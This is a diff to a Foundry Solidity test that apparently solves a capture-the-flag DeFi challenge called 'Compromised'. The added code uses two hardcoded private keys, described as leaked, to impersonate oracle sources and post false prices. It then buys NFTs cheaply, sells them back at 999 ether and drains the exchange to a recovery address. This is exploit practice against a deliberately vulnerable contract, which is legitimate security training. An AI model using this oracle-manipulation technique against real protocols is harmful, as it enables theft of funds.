@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,36 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        address pub1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744); //private keys leaked from the web page
+        address pub2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        assertEq(pub1, sources[0]);
+        assertEq(pub2, sources[1]);
+
+        console.log(oracle.getMedianPrice("DVNFT") / 1e18);
+
+        vm.startPrank(pub1);
+        oracle.postPrice("DVNFT", 1 ether);
+        vm.stopPrank();
+
+        vm.startPrank(pub2);
+        oracle.postPrice("DVNFT", 1 ether);
+
+        uint256 id1 = exchange.buyOne{value: 1 ether}();
+        uint256 id2 = exchange.buyOne{value: 1 ether}();
+
+        oracle.postPrice("DVNFT", 2 ether);
+        nft.approve(address(exchange), id1);
+        exchange.sellOne(id1);
+
+        oracle.postPrice("DVNFT", 999 ether);
+        nft.approve(address(exchange), id2);
+        exchange.sellOne(id2);
+
+        (bool ok,) = recovery.call{value: 999 ether}("");
+        require(ok);
+
+        vm.stopPrank();
+        console.log(oracle.getMedianPrice("DVNFT") / 1e18);
     }
 
     /**
